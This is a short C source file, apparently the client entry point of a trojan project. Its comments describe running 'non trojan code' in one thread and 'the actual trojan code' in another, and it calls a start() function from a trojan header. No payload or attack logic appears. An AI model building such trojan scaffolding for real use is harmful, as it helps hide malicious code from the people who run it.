/* This is the main file for the client.
 * This file is used to start threads, one 
 * runs the actual trojan.
 *
 * For more information:
 *
 *    https://github.com/pblcc/trj
 * */
#include <stdio.h>
#include <unistd.h>
#include "trojan/trojan.h"

int main() 
{
  /* Create two threads:
   *    
   *    - thMain -> Used for running the non trojan code
   *    - thTrojan -> Used for running the actual trojan code
   **/
  start();
}
